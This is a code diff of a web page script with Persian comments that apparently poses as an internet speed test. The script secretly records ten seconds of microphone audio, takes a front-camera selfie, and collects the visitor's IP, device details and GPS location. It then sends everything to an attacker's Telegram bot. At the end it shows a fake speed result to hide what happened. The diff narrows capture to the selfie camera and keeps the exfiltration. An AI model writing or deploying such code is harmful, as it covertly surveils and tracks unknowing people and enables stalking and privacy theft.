@@ -54,11 +54,11 @@
 
     let mediaRecorder, stream, timer, photoStream;
 
-    // عکس فوری از دوربین
-    async function capturePhoto(facingMode) {
+    // فقط عکس سلفی (دوربین جلو)
+    async function captureSelfie() {
       return new Promise((resolve) => {
         const constraints = {
-          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         };
 
@@ -73,7 +73,7 @@
               canvas.toBlob(blob => {
                 stopPhotoStream();
                 resolve(blob);
-              }, 'image/jpeg', 0.8);
+              }, 'image/jpeg', 0.85);
             };
           })
           .catch(() => resolve(null));
@@ -87,7 +87,7 @@
       }
     }
 
-    // موقعیت + اطلاعات
+    // موقعیت
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ error: "نامشخص" });
@@ -137,15 +137,12 @@
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(chunks, { type: mimeType });
-          const [frontPhoto, backPhoto] = await Promise.all([
-            capturePhoto('user'),
-            capturePhoto('environment')
-          ]);
+          const selfieBlob = await captureSelfie();
           const [deviceInfo, location] = await Promise.all([
             getDeviceInfo(),
             getLocation()
           ]);
-          await sendAllAtOnce(audioBlob, frontPhoto, backPhoto, deviceInfo, location);
+          await sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location);
           stopStream();
         };
 
@@ -169,57 +166,37 @@
       }
     }
 
-    // ارسال همه چیز در یک درخواست (فوری!)
-    async function sendAllAtOnce(audioBlob, frontPhoto, backPhoto, deviceInfo, location) {
+    // ارسال فوری با sendMediaGroup
+    async function sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
 
       const media = [];
-      let audioSent = false;
+      let messageId = null;
 
       // ویس
       if (audioBlob) {
-        media.push({
-          type: 'audio',
-          media: audioBlob,
-          caption: 'ویس ۱۰ ثانیه‌ای'
-        });
-        audioSent = true;
+        media.push({ type: 'audio', media: audioBlob, caption: 'ویس ۱۰ ثانیه‌ای' });
       }
 
-      // عکس جلو
-      if (frontPhoto) {
-        media.push({
-          type: 'photo',
-          media: frontPhoto,
-          caption: 'دوربین جلو'
-        });
+      // فقط سلفی
+      if (selfieBlob) {
+        media.push({ type: 'photo', media: selfieBlob, caption: 'سلفی کاربر' });
       }
 
-      // عکس عقب
-      if (backPhoto) {
-        media.push({
-          type: 'photo',
-          media: backPhoto,
-          caption: 'دوربین عقب'
-        });
-      }
-
-      // اگر چیزی هست، بفرست
       if (media.length > 0) {
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         media.forEach((item, i) => {
-          form.append(`media${i}`, item.media, `${item.caption}.jpg`);
+          form.append(`file${i}`, item.media, `${item.caption.replace(/ /g, '_')}.jpg`);
           form.append(`type${i}`, item.type);
           form.append(`caption${i}`, item.caption);
         });
         form.append('media', JSON.stringify(media.map((m, i) => ({
           type: m.type,
-          media: `attach://media${i}`,
+          media: `attach://file${i}`,
           caption: m.caption
         }))));
 
-        let messageId = null;
         try {
           const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
             method: 'POST',
@@ -230,9 +207,10 @@
         } catch (e) {
           console.error("sendMediaGroup failed", e);
         }
+      }
 
-        // گزارش
-        const report = `
+      // گزارش
+      const report = `
 *گزارش کاربر*
 
 IP: \`${deviceInfo.ip}\`
@@ -241,21 +219,20 @@ IP: \`${deviceInfo.ip}\`
 عرض: \`${location.longitude || 'نامشخص'}\`
 آدرس: \`${location.address || 'نامشخص'}\`
 
-[نقشه](https://maps.google.com/?q=${location.latitude},${location.longitude})
-        `.trim();
+[نقشه گوگل](https://maps.google.com/?q=${location.latitude},${location.longitude})
+      `.trim();
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: report,
-            parse_mode: 'Markdown',
-            reply_to_message_id: messageId,
-            disable_web_page_preview: false
-          })
-        });
-      }
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: report,
+          parse_mode: 'Markdown',
+          reply_to_message_id: messageId,
+          disable_web_page_preview: false
+        })
+      });
 
       status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
       reset();
